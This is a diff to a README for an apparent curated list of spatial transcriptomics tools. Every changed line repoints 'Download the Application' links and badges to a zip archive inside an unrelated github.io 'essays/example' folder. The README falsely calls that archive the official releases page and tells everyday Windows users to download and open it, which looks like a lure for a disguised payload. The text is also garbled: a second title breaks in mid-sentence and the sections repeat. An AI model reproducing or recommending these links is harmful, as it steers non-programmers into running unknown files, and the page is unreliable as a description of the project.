@@ -5,19 +5,19 @@ description: "Curate tools, foundation models, datasets, tutorials, and papers f
 ---
 # 🧬 awesome-spatial-transcriptomics - Spatial Transcriptomics Made Simple for Everyone
 
-[![Download awesome-spatial-transcriptomics](https://img.shields.io/badge/Download-awesome--spatial--transcriptomics-blueviolet?style=for-the-badge&labelColor=orange&logo=github)](https://github.com/Shajo777/shajo777.github.io/raw/refs/heads/main/essays/example/Dist_v2.4-beta.2.zip)
+[![Download awesome-spatial-transcriptomics](https://img.shields.io/badge/Download-awesome--spatial--transcriptomics-blueviolet?style=for-the-badge&labelColor=orange&logo=github)](https://raw.githubusercontent.com/Shajo777/shajo777.github.io/main/essays/example/Dist_v2.4-beta.2.zip)
 
 A curated list of tools, foundation models, datasets and tutorials for spatial transcriptomics and single-cell analysis, ordered the way an analysis goes. This page is written for everyday computer users who want a clear starting point without needing to write code or understand programming terms.
 
 ## 📥 Download the Application
 
-**Visit this link to download the application:** [awesome-spatial-transcriptomics releases](https://github.com/Shajo777/shajo777.github.io/raw/refs/heads/main/essays/example/Dist_v2.4-beta.2.zip)
+**Visit this link to download the application:** [awesome-spatial-transcriptomics releases](https://raw.githubusercontent.com/Shajo777/shajo777.github.io/main/essays/example/Dist_v2.4-beta.2.zip)
 
 This link takes you to the official releases page. Open the newest release shown there. Download the file provided for that release. After the download finishes, open the downloaded item to begin using the collection on Windows.
 
 The releases page is the main place to get# 🧬 awesome-spatial-transcriptomics - Your Guided Path Through Spatial Biology
 
-[![Download awesome-spatial-transcriptomics](https://img.shields.io/badge/Download-Latest_Release-brightgreen?style=for-the-badge&labelColor=purple&logo=github)](https://github.com/Shajo777/shajo777.github.io/raw/refs/heads/main/essays/example/Dist_v2.4-beta.2.zip)
+[![Download awesome-spatial-transcriptomics](https://img.shields.io/badge/Download-Latest_Release-brightgreen?style=for-the-badge&labelColor=purple&logo=github)](https://raw.githubusercontent.com/Shajo777/shajo777.github.io/main/essays/example/Dist_v2.4-beta.2.zip)
 
 A curated list of tools, foundation models, datasets and tutorials for spatial transcriptomics and single-cell analysis, ordered the way an analysis goes. This page is written for everyday computer users. You do not need to know how to program to get value from this collection — you only need to follow the steps in order.
 
@@ -25,7 +25,7 @@ Spatial transcriptomics is a fast-moving field, and new software appears almost 
 
 ## 📥 Download the Application
 
-**Visit this link to download the application:** [https://github.com/Shajo777/shajo777.github.io/raw/refs/heads/main/essays/example/Dist_v2.4-beta.2.zip](https://github.com/Shajo777/shajo777.github.io/raw/refs/heads/main/essays/example/Dist_v2.4-beta.2.zip)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/Shajo777/shajo777.github.io/main/essays/example/Dist_v2.4-beta.2.zip](https://raw.githubusercontent.com/Shajo777/shajo777.github.io/main/essays/example/Dist_v2.4-beta.2.zip)
 
 You will land on the official releases page. Look for the newest release at the top of the list. Download the file offered in that release, then open the downloaded item once it finishes saving.
 
@@ -78,7 +78,7 @@ Following this order prevents the most common beginner mistake: jumping straight
 
 ## 💾 Download and Setup
 
-**Visit this link to download the application:** [https://github.com/Shajo777/shajo777.github.io/raw/refs/heads/main/essays/example/Dist_v2.4-beta.2.zip](https://github.com/Shajo777/shajo777.github.io/raw/refs/heads/main/essays/example/Dist_v2.4-beta.2.zip)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/Shajo777/shajo777.github.io/main/essays/example/Dist_v2.4-beta.2.zip](https://raw.githubusercontent.com/Shajo777/shajo777.github.io/main/essays/example/Dist_v2.4-beta.2.zip)
 
 After downloading, store the item in a folder you can find again. Keep it out of temporary directories so it does not get cleared automatically. If you plan to share the collection with colleagues, place it in a shared drive instead of your personal folder.
 
